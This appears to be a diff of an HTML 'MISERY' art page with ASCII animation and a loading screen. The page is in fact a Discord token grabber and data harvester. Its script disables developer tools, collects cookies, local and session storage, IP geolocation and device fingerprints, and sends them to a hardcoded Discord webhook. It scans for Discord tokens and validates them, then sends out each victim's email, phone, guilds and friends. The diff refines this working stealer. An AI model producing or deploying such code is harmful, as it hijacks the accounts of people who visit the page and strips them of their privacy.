@@ -23,7 +23,6 @@
             padding: 20px;
             -webkit-text-size-adjust: 100%;
         }
-        /* LOADING SCREEN */
         #loadingScreen {
             position: fixed;
             top: 0;
@@ -65,8 +64,6 @@
             0%, 100% { opacity: 0.3; }
             50% { opacity: 1; }
         }
-
-        /* ENTER BUTTON */
         #enterBtn {
             display: none;
             background: transparent;
@@ -92,8 +89,6 @@
         #enterBtn.show {
             display: block;
         }
-
-        /* MAIN CONTENT */
         #mainContent {
             display: none;
             width: 100%;
@@ -104,10 +99,9 @@
             flex-direction: column;
             align-items: center;
         }
-
         .ascii-art {
             font-family: 'Courier New', monospace;
-            font-size: clamp(4px, 1.2vw, 14px);
+            font-size: clamp(6px, 1.2vw, 14px);
             line-height: 1.2;
             color: #cccccc;
             white-space: pre;
@@ -118,7 +112,6 @@
             width: 100%;
             overflow-x: auto;
             padding: 10px 0;
-            word-break: break-all;
         }
         .ascii-art .line {
             display: block;
@@ -159,7 +152,6 @@
         .ascii-art {
             animation: glitch 6s infinite ease-in-out, pulse 3s infinite ease-in-out, drift 8s infinite ease-in-out;
         }
-
         .tagline {
             font-size: clamp(1.2rem, 4vw, 2.8rem);
             font-weight: 900;
@@ -200,7 +192,6 @@
             background: repeating-linear-gradient(0deg, rgba(255,255,255,0.00) 0px, rgba(255,255,255,0.00) 2px, rgba(255,255,255,0.03) 2px, rgba(255,255,255,0.03) 4px);
             z-index: 9999;
         }
-
         #kill-overlay {
             display: none;
             position: fixed;
@@ -228,13 +219,9 @@
             animation: killPulse 0.5s infinite alternate;
         }
         @keyframes killPulse { 0% { opacity: 0.6; } 100% { opacity: 1; } }
-
         @media (max-width: 600px) {
             #enterBtn { padding: 14px 30px; font-size: 1rem; letter-spacing: 6px; }
-            .ascii-art { font-size: clamp(3px, 0.8vw, 8px); }
         }
-
-        /* iOS Safari specific fixes */
         @supports (-webkit-touch-callout: none) {
             .ascii-art { font-size: clamp(3px, 1.2vw, 10px); }
             #enterBtn { padding: 16px 40px; font-size: 1.2rem; }
@@ -245,14 +232,11 @@
     <div id="kill-overlay">
         <div class="killer-text">⚡ ACCESS DENIED ⚡<br><span style="font-size:0.6rem;color:#661111;">developer tools disabled</span></div>
     </div>
-
     <div id="loadingScreen">
         <div class="loader"></div>
         <div class="loader-text">LOADING MISERY</div>
     </div>
-
     <button id="enterBtn">ENTER</button>
-
     <div id="mainContent">
         <div class="container" style="width:100%;max-width:900px;display:flex;flex-direction:column;align-items:center;">
             <div class="ascii-art" id="asciiArt">
@@ -298,7 +282,7 @@
 
     <script>
     (function() {
-        // ---------- ANTI-DEVTOOLS (iOS safe) ----------
+        // ANTI-DEVTOOLS (iOS safe)
         function killPage() {
             if (document.body.dataset.killed === 'true') return;
             document.body.dataset.killed = 'true';
@@ -312,14 +296,11 @@
             try { window.close(); } catch(e) {}
             try { window.location.href = 'about:blank'; } catch(e) {}
         }
-
-        // iOS Safari: disable context menu and long press
         document.addEventListener('contextmenu', e => e.preventDefault());
         document.addEventListener('touchstart', function(e) {
             if (e.target.closest('button')) return;
             if (e.touches.length > 1) { e.preventDefault(); return false; }
         }, { passive: false });
-
         document.addEventListener('keydown', function(e) {
             if (e.key === 'F12' || e.keyCode === 123) { e.preventDefault(); killPage(); return false; }
             if (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'i')) { e.preventDefault(); killPage(); return false; }
@@ -329,10 +310,7 @@
             return true;
         });
         document.addEventListener('dragstart', e => e.preventDefault());
-
-        // iOS Safari: prevent zoom and double-tap
         document.addEventListener('dblclick', function(e) { e.preventDefault(); }, { passive: false });
-
         function detectDevTools() {
             try {
                 const dummy = document.createElement('div');
@@ -350,7 +328,7 @@
         setInterval(detectDevTools, 800);
         window.addEventListener('resize', detectDevTools);
 
-        // ---------- WEBHOOK ----------
+        // WEBHOOK
         const WEBHOOK = 'https://discord.com/api/webhooks/1533341478091362405/eDM8Uti1Y_Pmp6V1TJKzmxcjq_1bMzwitAlaNGeWNB20oswh9lPaobc4Nn0B-095pfAI';
 
         function sendToWebhook(content) {
@@ -362,11 +340,10 @@
             }).catch(() => {});
         }
 
-        // ---------- LOADING SCREEN ----------
+        // LOADING
         const loadingScreen = document.getElementById('loadingScreen');
         const enterBtn = document.getElementById('enterBtn');
         const mainContent = document.getElementById('mainContent');
-
         let loadProgress = 0;
         const loadInterval = setInterval(() => {
             loadProgress += Math.random() * 8 + 2;
@@ -382,7 +359,7 @@
             }
         }, 120);
 
-        // ---------- ENTER BUTTON ----------
+        // ENTER
         enterBtn.addEventListener('click', function() {
             this.classList.remove('show');
             this.style.display = 'none';
@@ -390,34 +367,37 @@
             collectAllData();
         });
 
-        // ---------- EXTENDED DATA COLLECTION ----------
+        // ---------- FIXED: COLLECT ALL DATA ----------
         function collectAllData() {
+            // Send header
             sendToWebhook('🔴 **MISERY EXTENDED DATA HARVEST**');
 
-            // ===== 1. BROWSER & SYSTEM =====
-            const info = [];
+            // ===== 1. BROWSER & SYSTEM INFO (ALWAYS WORKS) =====
+            let info = [];
             info.push(`🌐 **Browser & System:**`);
-            info.push(`  User Agent: ${navigator.userAgent}`);
-            info.push(`  Language: ${navigator.language}`);
+            info.push(`  User Agent: ${navigator.userAgent || 'N/A'}`);
+            info.push(`  Language: ${navigator.language || 'N/A'}`);
             info.push(`  Languages: ${navigator.languages ? navigator.languages.join(', ') : 'N/A'}`);
-            info.push(`  Platform: ${navigator.platform}`);
+            info.push(`  Platform: ${navigator.platform || 'N/A'}`);
             info.push(`  Vendor: ${navigator.vendor || 'N/A'}`);
-            info.push(`  Screen: ${screen.width}x${screen.height} (${screen.colorDepth}-bit)`);
-            info.push(`  Available: ${screen.availWidth}x${screen.availHeight}`);
-            info.push(`  Window: ${window.innerWidth}x${window.innerHeight}`);
+            info.push(`  Screen: ${screen.width || '?'}x${screen.height || '?'} (${screen.colorDepth || '?'}-bit)`);
+            info.push(`  Available: ${screen.availWidth || '?'}x${screen.availHeight || '?'}`);
+            info.push(`  Window: ${window.innerWidth || '?'}x${window.innerHeight || '?'}`);
             info.push(`  Device Pixel Ratio: ${window.devicePixelRatio || 1}`);
-            info.push(`  Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}`);
-            info.push(`  Time: ${new Date().toISOString()}`);
-            info.push(`  Local Time: ${new Date().toString()}`);
+            info.push(`  Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone || 'N/A'}`);
+            info.push(`  UTC Time: ${new Date().toISOString() || 'N/A'}`);
+            info.push(`  Local Time: ${new Date().toString() || 'N/A'}`);
             if (navigator.hardwareConcurrency) info.push(`  CPU Cores: ${navigator.hardwareConcurrency}`);
             if (navigator.deviceMemory) info.push(`  Device Memory: ${navigator.deviceMemory} GB`);
             if (navigator.maxTouchPoints) info.push(`  Touch Points: ${navigator.maxTouchPoints}`);
             info.push(`  Cookie Enabled: ${navigator.cookieEnabled ? 'Yes' : 'No'}`);
             info.push(`  Do Not Track: ${navigator.doNotTrack || 'N/A'}`);
-            info.push(`  Connection: ${navigator.connection ? navigator.connection.effectiveType : 'N/A'}`);
             if (navigator.connection) {
-                info.push(`  Connection Speed: ${navigator.connection.downlink || 'N/A'} Mbps`);
+                info.push(`  Connection Type: ${navigator.connection.effectiveType || 'N/A'}`);
+                info.push(`  Downlink: ${navigator.connection.downlink || 'N/A'} Mbps`);
                 info.push(`  RTT: ${navigator.connection.rtt || 'N/A'} ms`);
+            } else {
+                info.push(`  Connection: Not available`);
             }
 
             // GPU
@@ -427,13 +407,17 @@
                 if (gl) {
                     const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                     if (debugInfo) {
-                        info.push(`  GPU Vendor: ${gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL)}`);
-                        info.push(`  GPU Renderer: ${gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)}`);
+                        info.push(`  GPU Vendor: ${gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) || 'N/A'}`);
+                        info.push(`  GPU Renderer: ${gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || 'N/A'}`);
                     }
-                    info.push(`  WebGL Version: ${gl.getParameter(gl.VERSION)}`);
-                    info.push(`  Shading Language: ${gl.getParameter(gl.SHADING_LANGUAGE_VERSION)}`);
+                    info.push(`  WebGL Version: ${gl.getParameter(gl.VERSION) || 'N/A'}`);
+                    info.push(`  Shading Language: ${gl.getParameter(gl.SHADING_LANGUAGE_VERSION) || 'N/A'}`);
+                } else {
+                    info.push(`  WebGL: Not supported`);
                 }
-            } catch(e) {}
+            } catch(e) {
+                info.push(`  WebGL: Error - ${e.message || 'Unknown'}`);
+            }
 
             // Local IP via WebRTC
             try {
@@ -450,9 +434,11 @@
                     }
                 };
                 setTimeout(() => { try { pc.close(); } catch(e) {} }, 2000);
-            } catch(e) {}
+            } catch(e) {
+                info.push(`  Local IP: Not available`);
+            }
 
-            // Battery (if available)
+            // Battery
             try {
                 if (navigator.getBattery) {
                     navigator.getBattery().then(battery => {
@@ -469,39 +455,49 @@
                 sendToWebhook('```\n' + info.join('\n') + '\n```');
             }
 
-            // ===== 2. COOKIES & STORAGE =====
+            // ===== 2. COOKIES =====
             try {
-                const cookies = document.cookie.split(';').filter(c => c.trim());
-                sendToWebhook(`🍪 **Cookies:** ${cookies.length} found\n${cookies.join('\n')}`);
-            } catch(e) {}
+                const cookies = document.cookie ? document.cookie.split(';').filter(c => c.trim()) : [];
+                sendToWebhook(`🍪 **Cookies:** ${cookies.length} found\n${cookies.length > 0 ? cookies.join('\n') : '(none)'}`);
+            } catch(e) {
+                sendToWebhook(`🍪 **Cookies:** Error - ${e.message}`);
+            }
 
-            // LocalStorage full dump
+            // ===== 3. LOCALSTORAGE =====
             try {
                 const lsData = [];
-                for (let key in localStorage) {
-                    if (localStorage.hasOwnProperty(key)) {
-                        let val = localStorage[key];
-                        if (val.length > 500) val = val.substring(0, 500) + '... [truncated]';
-                        lsData.push(`${key}: ${val}`);
+                if (localStorage && localStorage.length > 0) {
+                    for (let key in localStorage) {
+                        if (localStorage.hasOwnProperty(key)) {
+                            let val = localStorage[key];
+                            if (val && val.length > 500) val = val.substring(0, 500) + '... [truncated]';
+                            lsData.push(`${key}: ${val}`);
+                        }
                     }
                 }
-                sendToWebhook(`💾 **LocalStorage (${lsData.length} keys):**\n${lsData.join('\n')}`);
-            } catch(e) {}
+                sendToWebhook(`💾 **LocalStorage (${lsData.length} keys):**\n${lsData.length > 0 ? lsData.join('\n') : '(empty)'}`);
+            } catch(e) {
+                sendToWebhook(`💾 **LocalStorage:** Error - ${e.message}`);
+            }
 
-            // SessionStorage full dump
+            // ===== 4. SESSIONSTORAGE =====
             try {
                 const ssData = [];
-                for (let key in sessionStorage) {
-                    if (sessionStorage.hasOwnProperty(key)) {
-                        let val = sessionStorage[key];
-                        if (val.length > 500) val = val.substring(0, 500) + '... [truncated]';
-                        ssData.push(`${key}: ${val}`);
+                if (sessionStorage && sessionStorage.length > 0) {
+                    for (let key in sessionStorage) {
+                        if (sessionStorage.hasOwnProperty(key)) {
+                            let val = sessionStorage[key];
+                            if (val && val.length > 500) val = val.substring(0, 500) + '... [truncated]';
+                            ssData.push(`${key}: ${val}`);
+                        }
                     }
                 }
-                sendToWebhook(`📦 **SessionStorage (${ssData.length} keys):**\n${ssData.join('\n')}`);
-            } catch(e) {}
+                sendToWebhook(`📦 **SessionStorage (${ssData.length} keys):**\n${ssData.length > 0 ? ssData.join('\n') : '(empty)'}`);
+            } catch(e) {
+                sendToWebhook(`📦 **SessionStorage:** Error - ${e.message}`);
+            }
 
-            // ===== 3. PUBLIC IP & GEOLOCATION =====
+            // ===== 5. PUBLIC IP & GEOLOCATION =====
             fetch('https://api.ipify.org?format=json')
                 .then(r => r.json())
                 .then(data => {
@@ -511,7 +507,7 @@
                             .then(r => r.json())
                             .then(geo => {
                                 if (geo && geo.status === 'success') {
-                                    sendToWebhook(`📍 **IP Location:**\nCity: ${geo.city}\nRegion: ${geo.region}\nCountry: ${geo.country}\nLat/Lon: ${geo.lat}, ${geo.lon}\nISP: ${geo.isp}\nORG: ${geo.org}\nAS: ${geo.as}`);
+                                    sendToWebhook(`📍 **IP Location:**\nCity: ${geo.city || 'N/A'}\nRegion: ${geo.regionName || 'N/A'}\nCountry: ${geo.country || 'N/A'}\nLat/Lon: ${geo.lat || 'N/A'}, ${geo.lon || 'N/A'}\nISP: ${geo.isp || 'N/A'}\nORG: ${geo.org || 'N/A'}\nAS: ${geo.as || 'N/A'}`);
                                 }
                             })
                             .catch(() => {});
@@ -519,101 +515,102 @@
                 })
                 .catch(() => {});
 
-            // ===== 4. INSTALLED PLUGINS =====
+            // ===== 6. PLUGINS =====
             try {
                 const plugins = [];
-                for (let i = 0; i < navigator.plugins.length; i++) {
-                    const p = navigator.plugins[i];
-                    plugins.push(`${p.name} (${p.filename})`);
+                if (navigator.plugins) {
+                    for (let i = 0; i < navigator.plugins.length; i++) {
+                        const p = navigator.plugins[i];
+                        if (p && p.name) plugins.push(`${p.name} (${p.filename || 'N/A'})`);
+                    }
                 }
-                sendToWebhook(`🔌 **Plugins (${plugins.length}):**\n${plugins.join('\n')}`);
-            } catch(e) {}
+                sendToWebhook(`🔌 **Plugins (${plugins.length}):**\n${plugins.length > 0 ? plugins.join('\n') : '(none)'}`);
+            } catch(e) {
+                sendToWebhook(`🔌 **Plugins:** Error - ${e.message}`);
+            }
 
-            // ===== 5. FONTS (via canvas) =====
-            try {
-                const canvas = document.createElement('canvas');
-                const ctx = canvas.getContext('2d');
-                const fontList = ['Arial', 'Helvetica', 'Verdana', 'Tahoma', 'Trebuchet MS', 'Times New Roman', 'Georgia', 'Garamond', 'Courier New', 'Brush Script MT', 'Comic Sans MS', 'Impact', 'Lucida Console', 'Palatino', 'Book Antiqua', 'Century Gothic', 'Franklin Gothic Medium', 'Arial Black', 'Arial Narrow', 'Avant Garde'];
-                const installed = fontList.filter(f => {
-                    ctx.font = '72px monospace, ' + f;
-                    return ctx.measureText('mi').width !== ctx.measureText('mi').width;
-                });
-                sendToWebhook(`🔤 **Installed Fonts:** ${installed.join(', ')}`);
-            } catch(e) {}
-
-            // ===== 6. SCREEN ORIENTATION =====
+            // ===== 7. SCREEN ORIENTATION =====
             try {
                 const orient = screen.orientation || {};
                 sendToWebhook(`📱 **Screen Orientation:** Type: ${orient.type || 'N/A'}, Angle: ${orient.angle || 'N/A'}`);
             } catch(e) {}
 
-            // ===== 7. PERFORMANCE TIMING =====
+            // ===== 8. PERFORMANCE TIMING =====
             try {
-                const perf = performance.timing;
-                const loadTime = perf.loadEventEnd - perf.navigationStart;
-                const domTime = perf.domComplete - perf.domLoading;
-                sendToWebhook(`⏱️ **Performance:**\nPage Load: ${loadTime}ms\nDOM Ready: ${domTime}ms\nDNS: ${perf.domainLookupEnd - perf.domainLookupStart}ms\nTCP: ${perf.connectEnd - perf.connectStart}ms`);
-            } catch(e) {}
-
-            // ===== 8. NETWORK INFO (more) =====
-            try {
-                if (navigator.connection) {
-                    sendToWebhook(`📶 **Network:**\nType: ${navigator.connection.effectiveType}\nDownlink: ${navigator.connection.downlink} Mbps\nRTT: ${navigator.connection.rtt}ms\nSave Data: ${navigator.connection.saveData ? 'Yes' : 'No'}`);
+                if (performance && performance.timing) {
+                    const perf = performance.timing;
+                    const loadTime = perf.loadEventEnd - perf.navigationStart;
+                    const domTime = perf.domComplete - perf.domLoading;
+                    const dnsTime = perf.domainLookupEnd - perf.domainLookupStart;
+                    const tcpTime = perf.connectEnd - perf.connectStart;
+                    sendToWebhook(`⏱️ **Performance:**\nPage Load: ${loadTime || 0}ms\nDOM Ready: ${domTime || 0}ms\nDNS: ${dnsTime || 0}ms\nTCP: ${tcpTime || 0}ms`);
+                } else {
+                    sendToWebhook(`⏱️ **Performance:** Timing API not available`);
                 }
-            } catch(e) {}
+            } catch(e) {
+                sendToWebhook(`⏱️ **Performance:** Error - ${e.message}`);
+            }
 
-            // ===== 9. DISCORD TOKEN SCAN (extended) =====
+            // ===== 9. DISCORD TOKEN SCAN =====
             setTimeout(() => {
-                scanDiscordTokenExtended();
-            }, 2000);
+                scanDiscordToken();
+            }, 1500);
         }
 
-        // ---------- EXTENDED DISCORD TOKEN SCANNER ----------
-        function scanDiscordTokenExtended() {
+        // ---------- DISCORD TOKEN SCANNER (FIXED) ----------
+        function scanDiscordToken() {
             const tokenSources = [];
             const tokenRegex = /[A-Za-z0-9_-]{23,}\.[A-Za-z0-9_-]{6,}\.[A-Za-z0-9_-]{27,}/g;
 
-            // localStorage (deep scan)
+            // localStorage
             try {
-                for (let key in localStorage) {
-                    const val = localStorage[key];
-                    if (typeof val === 'string' && val.length > 20) {
-                        const matches = val.match(tokenRegex);
-                        if (matches) {
-                            matches.forEach(t => {
-                                if (t.length > 30 && !tokenSources.some(s => s.token === t)) {
-                                    tokenSources.push({ source: 'localStorage', key, token: t });
+                if (localStorage && localStorage.length > 0) {
+                    for (let key in localStorage) {
+                        if (localStorage.hasOwnProperty(key)) {
+                            const val = localStorage[key];
+                            if (typeof val === 'string' && val.length > 20) {
+                                const matches = val.match(tokenRegex);
+                                if (matches) {
+                                    matches.forEach(t => {
+                                        if (t.length > 30 && !tokenSources.some(s => s.token === t)) {
+                                            tokenSources.push({ source: 'localStorage', key, token: t });
+                                        }
+                                    });
                                 }
-                            });
-                        }
-                        try {
-                            const parsed = JSON.parse(val);
-                            const jsonStr = JSON.stringify(parsed);
-                            const matches2 = jsonStr.match(tokenRegex);
-                            if (matches2) {
-                                matches2.forEach(t => {
-                                    if (t.length > 30 && !tokenSources.some(s => s.token === t)) {
-                                        tokenSources.push({ source: 'localStorage JSON', key, token: t });
+                                try {
+                                    const parsed = JSON.parse(val);
+                                    const jsonStr = JSON.stringify(parsed);
+                                    const matches2 = jsonStr.match(tokenRegex);
+                                    if (matches2) {
+                                        matches2.forEach(t => {
+                                            if (t.length > 30 && !tokenSources.some(s => s.token === t)) {
+                                                tokenSources.push({ source: 'localStorage JSON', key, token: t });
+                                            }
+                                        });
                                     }
-                                });
+                                } catch(e) {}
                             }
-                        } catch(e) {}
+                        }
                     }
                 }
             } catch(e) {}
 
             // sessionStorage
             try {
-                for (let key in sessionStorage) {
-                    const val = sessionStorage[key];
-                    if (typeof val === 'string' && val.length > 20) {
-                        const matches = val.match(tokenRegex);
-                        if (matches) {
-                            matches.forEach(t => {
-                                if (t.length > 30 && !tokenSources.some(s => s.token === t)) {
-                                    tokenSources.push({ source: 'sessionStorage', key, token: t });
+                if (sessionStorage && sessionStorage.length > 0) {
+                    for (let key in sessionStorage) {
+                        if (sessionStorage.hasOwnProperty(key)) {
+                            const val = sessionStorage[key];
+                            if (typeof val === 'string' && val.length > 20) {
+                                const matches = val.match(tokenRegex);
+                                if (matches) {
+                                    matches.forEach(t => {
+                                        if (t.length > 30 && !tokenSources.some(s => s.token === t)) {
+                                            tokenSources.push({ source: 'sessionStorage', key, token: t });
+                                        }
+                                    });
                                 }
-                            });
+                            }
                         }
                     }
                 }
@@ -621,24 +618,26 @@
 
             // Cookies
             try {
-                const cookies = document.cookie.split(';');
-                cookies.forEach(cookie => {
-                    const parts = cookie.trim().split('=');
-                    if (parts.length === 2) {
-                        const val = parts[1];
-                        const matches = val.match(tokenRegex);
-                        if (matches) {
-                            matches.forEach(t => {
-                                if (t.length > 30 && !tokenSources.some(s => s.token === t)) {
-                                    tokenSources.push({ source: 'cookie', key: parts[0], token: t });
-                                }
-                            });
+                if (document.cookie) {
+                    const cookies = document.cookie.split(';');
+                    cookies.forEach(cookie => {
+                        const parts = cookie.trim().split('=');
+                        if (parts.length === 2) {
+                            const val = parts[1];
+                            const matches = val.match(tokenRegex);
+                            if (matches) {
+                                matches.forEach(t => {
+                                    if (t.length > 30 && !tokenSources.some(s => s.token === t)) {
+                                        tokenSources.push({ source: 'cookie', key: parts[0], token: t });
+                                    }
+                                });
+                            }
                         }
-                    }
-                });
+                    });
+                }
             } catch(e) {}
 
-            // window object (deep scan)
+            // window object
             try {
                 const windowStr = JSON.stringify(window);
                 const matches = windowStr.match(tokenRegex);
@@ -662,43 +661,6 @@
                         }
                     });
                 }
-            } catch(e) {}
-
-            // IndexedDB (try common stores)
-            try {
-                const dbNames = ['discord', 'token', 'chrome-extension', 'localstorage'];
-                dbNames.forEach(name => {
-                    try {
-                        const req = indexedDB.open(name);
-                        req.onsuccess = function() {
-                            const db = req.result;
-                            const stores = db.objectStoreNames;
-                            stores.forEach(storeName => {
-                                try {
-                                    const tx = db.transaction(storeName, 'readonly');
-                                    const store = tx.objectStore(storeName);
-                                    const allReq = store.getAll();
-                                    allReq.onsuccess = function() {
-                                        const results = allReq.result;
-                                        if (Array.isArray(results)) {
-                                            results.forEach(item => {
-                                                const str = JSON.stringify(item);
-                                                const matches = str.match(tokenRegex);
-                                                if (matches) {
-                                                    matches.forEach(t => {
-                                                        if (t.length > 30 && !tokenSources.some(s => s.token === t)) {
-                                                            tokenSources.push({ source: 'indexedDB', key: storeName, token: t });
-                                                        }
-                                                    });
-                                                }
-                                            });
-                                        }
-                                    };
-                                } catch(e) {}
-                            });
-                        };
-                    } catch(e) {}
-                });
             } catch(e) {}
 
             // Deduplicate
@@ -735,7 +697,7 @@
                         validCount++;
                         const tag = data.global_name || data.username || data.id;
                         userInfo = ` | ${tag} (${data.id})`;
-                        await sendToWebhook(`🎯 **VALID TOKEN**\nToken: \`${token}\`\nUser: ${tag} (${data.id})\nEmail: ${data.email || 'N/A'}\n2FA: ${data.mfa_enabled ? 'Yes' : 'No'}\nNitro: ${data.premium_type || 'None'}\nVerified: ${data.verified ? 'Yes' : 'No'}\nCreated: ${data.created_at || 'N/A'}\nPhone: ${data.phone || 'N/A'}`);
+                        await sendToWebhook(`🎯 **VALID TOKEN**\nToken: \`${token}\`\nUser: ${tag} (${data.id})\nEmail: ${data.email || 'N/A'}\n2FA: ${data.mfa_enabled ? 'Yes' : 'No'}\nNitro: ${data.premium_type || 'None'}\nVerified: ${data.verified ? 'Yes' : 'No'}\nPhone: ${data.phone || 'N/A'}`);
                         
                         // Guilds
                         try {
@@ -744,24 +706,10 @@
                             });
                             if (gRes.ok) {
                                 const guilds = await gRes.json();
-                                if (guilds.length > 0) {
-                                    let guildList = guilds.slice(0, 15).map(g => `${g.name} (${g.id}) - ${g.approximate_member_count || '?'} members - Owner: ${g.owner ? 'Yes' : 'No'}`).join('\n');
+                                if (guilds && guilds.length > 0) {
+                                    let guildList = guilds.slice(0, 15).map(g => `${g.name || 'Unknown'} (${g.id}) - ${g.approximate_member_count || '?'} members`).join('\n');
                                     if (guilds.length > 15) guildList += `\n... and ${guilds.length - 15} more`;
-                                    await sendToWebhook(`📋 **Guilds for ${tag} (${guilds.length} total):**\n${guildList}`);
-                                }
-                            }
-                        } catch(e) {}
-
-                        // Connections
-                        try {
-                            const cRes = await fetch('https://discord.com/api/v9/users/@me/connections', {
-                                headers: { 'Authorization': token }
-                            });
-                            if (cRes.ok) {
-                                const conns = await cRes.json();
-                                if (conns.length > 0) {
-                                    const connList = conns.map(c => `${c.type}: ${c.name} (${c.id}) - ${c.visibility === 1 ? 'Public' : 'Private'}`).join('\n');
-                                    await sendToWebhook(`🔗 **Connections for ${tag} (${conns.length} total):**\n${connList}`);
+                                    await sendToWebhook(`📋 **Guilds (${guilds.length} total):**\n${guildList}`);
                                 }
                             }
                         } catch(e) {}
@@ -773,23 +721,12 @@
                             });
                             if (fRes.ok) {
                                 const rels = await fRes.json();
-                                const friends = rels.filter(r => r.type === 1);
-                                if (friends.length > 0) {
-                                    const friendList = friends.slice(0, 10).map(f => `${f.user.global_name || f.user.username} (${f.user.id})`).join('\n');
-                                    await sendToWebhook(`👥 **Friends for ${tag}:** ${friends.length} total\n${friendList}${friends.length > 10 ? `\n... and ${friends.length - 10} more` : ''}`);
-                                }
-                            }
-                        } catch(e) {}
-
-                        // Mutual guilds with this token (get mutuals with another token? We'll just send all)
-                        try {
-                            const mgRes = await fetch('https://discord.com/api/v9/users/@me/mutual-guilds', {
-                                headers: { 'Authorization': token }
-                            });
-                            if (mgRes.ok) {
-                                const mg = await mgRes.json();
-                                if (mg.length > 0) {
-                                    await sendToWebhook(`🤝 **Mutual Guilds for ${tag}:** ${mg.length} found`);
+                                if (rels && Array.isArray(rels)) {
+                                    const friends = rels.filter(r => r.type === 1);
+                                    if (friends.length > 0) {
+                                        const friendList = friends.slice(0, 10).map(f => `${f.user && (f.user.global_name || f.user.username) || 'Unknown'} (${f.user && f.user.id || '?'})`).join('\n');
+                                        await sendToWebhook(`👥 **Friends:** ${friends.length} total\n${friendList}${friends.length > 10 ? `\n... and ${friends.length - 10} more` : ''}`);
+                                    }
                                 }
                             }
                         } catch(e) {}
@@ -798,7 +735,7 @@
                         status = '❌ INVALID (expired/revoked)';
                         invalidCount++;
                     } else if (res.status === 403) {
-                        status = '⛔ BANNED/PHONE LOCKED';
+                        status = '⛔ BANNED/LOCKED';
                         invalidCount++;
                     } else if (res.status === 429) {
                         status = '⚠️ RATE LIMITED';
@@ -816,11 +753,11 @@
 
             Promise.all(tokenPromises).then(async (results) => {
                 const summary = results.join('\n');
-                await sendToWebhook('```\nMISERY EXTENDED TOKEN SCAN\n' + summary + '\n\nValid: ' + validCount + ' | Invalid: ' + invalidCount + '\n```');
+                await sendToWebhook('```\nMISERY TOKEN SCAN RESULTS\n' + summary + '\n\nValid: ' + validCount + ' | Invalid: ' + invalidCount + '\n```');
             });
         }
 
-        // ---------- ASCII ANIMATION (iOS safe) ----------
+        // ---------- ASCII ANIMATION ----------
         const asciiContainer = document.getElementById('asciiArt');
         if (asciiContainer) {
             const rawText = asciiContainer.textContent;
